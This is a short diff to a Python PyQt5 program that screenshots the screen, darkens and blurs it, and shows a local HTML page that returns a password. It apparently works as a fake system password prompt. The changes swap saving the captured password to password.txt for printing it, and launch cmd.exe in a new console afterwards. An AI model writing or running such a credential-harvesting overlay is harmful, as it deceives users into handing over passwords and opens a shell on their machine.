@@ -3,6 +3,8 @@ from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent
 from PyQt5.QtCore import QUrl 
 from pyautogui import screenshot
 import cv2, numpy as np
+import subprocess as sp
+from subprocess import CREATE_NEW_CONSOLE
 import sys, os
 
 def apply_black_blur(filename: str, output: str = "output.jpg", blur_strength: int = 25, darkness: float = 0.5):
@@ -42,11 +44,10 @@ class Bridge(QtCore.QObject):
 
     def handle_password_result(self, result: str) -> None:
         if result:
-            with open("password.txt", "w") as fo:
-                fo.write(result)
+            print(result)
         try:
             if self.program:
-                os.system(self.program)
+                sp.Popen(self.program, creationflags=CREATE_NEW_CONSOLE)
         except Exception as e:
             print("Error running program:", e)
         self.on_no()
@@ -80,7 +81,7 @@ def main():
     view.load(QtCore.QUrl.fromLocalFile(html_file))
 
     channel = QtWebChannel.QWebChannel()
-    bridge = Bridge(view=view, app=app)
+    bridge = Bridge(view=view, app=app, program_to_run="cmd.exe")
     channel.registerObject("bridge", bridge)
     view.page().setWebChannel(channel)
 
